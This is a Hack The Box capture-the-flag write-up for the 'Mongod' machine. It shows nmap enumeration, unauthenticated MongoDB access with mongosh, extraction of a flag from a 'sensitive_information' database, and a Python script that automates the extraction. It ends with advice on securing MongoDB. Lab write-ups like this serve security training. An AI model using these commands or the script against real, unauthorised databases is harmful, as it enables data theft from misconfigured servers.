# Hack The Box - Mongod Writeup

![HTB Banner](https://www.hackthebox.com/badge/image/your-badge-id)

## 🔥 Overview
**Machine Name:** Mongod  
**Difficulty:** Easy  
**Vulnerability:** MongoDB Misconfiguration  
**Attack Vector:** Unauthenticated Database Access  
**Technology Stack:** MongoDB NoSQL Database (TCP:27017)  

---

## 🎯 **Target Enumeration & Recon**

### **1️⃣ Nmap Scan**
We start with an **Nmap** scan to identify open ports and services running on the target machine:

```bash
nmap -sC -sV -p- 10.129.107.200
```

**Results:**
```
PORT      STATE SERVICE    VERSION
27017/tcp open  mongodb    MongoDB 3.6.8
```
MongoDB is running on **port 27017**, and based on the **version (3.6.8)**, it might be **misconfigured**.

---

## 🚀 **Exploitation: Unauthenticated MongoDB Access**
MongoDB sometimes allows **unauthenticated access**, meaning we can connect and extract information **without credentials**.

### **2️⃣ Connecting to MongoDB**
We use `mongosh` (MongoDB shell) to check if we have direct access:

```bash
mongosh mongodb://10.129.107.200:27017
```

If we connect successfully, we can list the available databases:

```javascript
show dbs;
```

**Output:**
```
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

The **`sensitive_information`** database seems interesting.

---

## 🎯 **Extracting the Flag**
Let's switch to the **sensitive_information** database and list its collections:

```javascript
use sensitive_information;
show collections;
```

**Output:**
```
flag
```

We extract the data:

```javascript
db.flag.find();
```

**Output:**
```json
[
  {
    "_id": ObjectId("630e3dbcb82540ebbd1748c5"),
    "flag": "1b6e6fb359e7c40241b6d431427ba6ea"
  }
]
```

✅ **FLAG FOUND:** `1b6e6fb359e7c40241b6d431427ba6ea`

---

## 🔥 **Automating the Exploit**
Instead of doing this manually, we created a Python exploit:

```python
import os
import subprocess
import re

TARGET_IP = "10.129.107.200"
OUTPUT_FILE = "mongo_output.json"

def extract_flag():
    print("[*] Connecting to MongoDB and extracting flag...")

    mongosh_commands = """
    show dbs;
    use sensitive_information;
    show collections;
    db.flag.find();
    """

    result = subprocess.run(
        ["mongosh", f"mongodb://{TARGET_IP}:27017", "--quiet"],
        input=mongosh_commands,
        text=True,
        capture_output=True
    )

    output = result.stdout.strip()
    if not output:
        print("[-] No output received from MongoDB.")
        return

    with open(OUTPUT_FILE, "w") as f:
        f.write(output)

    print(f"[+] MongoDB output saved to {OUTPUT_FILE}")

    match = re.search(r"flag:\s*'([a-f0-9]+)'", output)
    if match:
        flag = match.group(1)
        print(f"[✔] FLAG EXTRACTED: {flag}")
    else:
        print("[-] Flag not found.")

if __name__ == "__main__":
    extract_flag()
```

Save this script as `mongo_pwn.py` and run:

```bash
python3 mongo_pwn.py
```

---

## 🎯 **Conclusion**
This box demonstrates the **importance of securing MongoDB** against unauthenticated access. The key takeaways:

- Always **require authentication** for databases.
- **Disable remote access** if not needed.
- **Upgrade MongoDB** to prevent known exploits.

✅ **Mission Accomplished!** 🎉

---

## 💀 **AfterDark Security**
Follow **#AfterDark** for more **CTF solutions, pentesting tricks, and cybersecurity research!**  
🚀 **GitHub:** [Your Repo Link]  
🐦 **Twitter:** [Your Twitter Handle]  

---

